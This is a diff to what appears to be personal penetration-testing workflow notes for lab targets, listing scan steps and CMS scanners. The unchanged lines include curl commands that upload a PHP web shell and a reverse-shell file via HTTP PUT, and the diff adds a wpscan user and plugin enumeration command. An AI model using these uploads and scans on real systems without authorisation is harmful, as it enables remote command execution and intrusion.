@@ -4,7 +4,7 @@
 
 ## TODO:
 - build list of dummy password to try
-
+f
 ## workflow
 1. zenmap intensive scan
 2. zenmap full tcp scan
@@ -22,7 +22,7 @@
     - `curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.142.131/test/shell.php`
     - `curl --upload-file  php-reverse-shell.txt -v --url http://192.168.142.131/test/shell.php -0 --http1.0`
 1. cms scan (? todo: read it from a tool)
-    - `wpscan` (wordpress)
+    - `wpscan` (wordpress) - `wpscan -u http://192.168.56.223/bull/ --enumerate u --enumerate p` # scan vulnerable plugin and find user names
     - `joomscan` (joombla)
     - `drupalscan`(?)
 1. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
